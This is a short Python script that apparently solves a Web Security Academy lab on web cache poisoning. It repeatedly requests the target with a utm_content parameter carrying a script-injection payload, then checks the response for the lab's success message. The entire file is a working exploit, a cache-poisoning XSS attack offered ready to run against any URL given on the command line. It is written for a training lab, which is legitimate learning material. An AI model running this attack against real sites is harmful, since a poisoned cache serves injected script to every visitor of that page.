import sys
import requests



def poison_web_cache(url, session):
    for i in range(100):
        response = session.get(f"{url}/?utm_content='/><script>alert(1)</script>", timeout=10)
        if "Congratulations, you solved the lab!" in response.text:
            return True


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))


        print("(+) Poisoning web cache...")
        if poison_web_cache(url, session):
            print("(+) Lab Solved Successfully!")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()